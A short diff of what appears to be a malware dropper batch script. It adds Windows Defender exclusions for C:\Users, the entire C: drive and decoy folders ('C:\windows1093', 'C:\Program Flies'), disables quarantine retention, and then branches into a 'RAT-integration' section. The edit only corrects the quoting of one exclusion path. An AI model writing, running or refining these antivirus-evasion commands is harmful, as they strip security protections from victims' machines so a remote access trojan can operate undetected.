@@ -3,7 +3,7 @@ set RAT=0
 powershell -Command "Set-MpPreference -ExclusionPath C:\Users"
 powershell -Command "Set-MpPreference -ExclusionPath C:"
 powershell -Command "Set-MpPreference -ExclusionPath C:\windows1093"
-powershell -Command "Set-MpPreference -ExclusionPath C:\Program%20Flies"
+powershell -Command "Set-MpPreference -ExclusionPath 'C:\Program Flies'"
 powershell -Command "Set-MpPreference -QuarantinePurgeItemsAfterDelay 0"
 ::RAT-integration
 if %RAT%==0 goto SkipRAT
